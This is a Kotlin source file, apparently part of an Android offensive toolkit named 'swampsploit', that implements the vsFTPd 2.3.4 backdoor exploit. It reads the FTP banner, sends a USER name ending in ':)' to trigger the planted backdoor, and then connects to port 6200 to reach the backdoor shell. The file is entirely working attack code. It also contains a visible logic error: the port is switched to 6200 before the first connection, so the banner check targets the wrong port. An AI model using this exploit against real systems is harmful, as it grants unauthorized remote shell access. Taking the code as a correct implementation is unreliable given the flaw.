package me.smoothhacker.swampsploit.exploit

import android.util.Log
import me.smoothhacker.swampsploit.utils.ExploitContext
import java.io.PrintWriter
import java.net.InetSocketAddress
import java.net.Socket
import java.net.SocketTimeoutException

class VSFTP constructor(
    private val ctx: ExploitContext
) {
    fun exploit() {
        val timeout = 5000 // ms
        ctx.setPort(6200)

        val socket = Socket()
        socket.connect(InetSocketAddress(ctx.getHost(0), ctx.getPort()), timeout)

        val reader = socket.getInputStream().bufferedReader()
        val writer = PrintWriter(socket.getOutputStream(), true)

        if (reader.readLine().contains("(vsFTPd 2.3.4)")) {
            writer.println("USER swampsploit:)")
            writer.println("PASS password")
            val backdoorSocket = Socket()
            try {
                backdoorSocket.connect(InetSocketAddress(ctx.getHost(0), ctx.getPort()), timeout)
                // backdoorSocket is connected to shell backdoor
                Log.w("vsftpd", "Success")
            } catch (e: SocketTimeoutException) {
                Log.w("vsftpd", "Connection timed out")
            }
            backdoorSocket.close()
        }
        socket.close()
    }
}
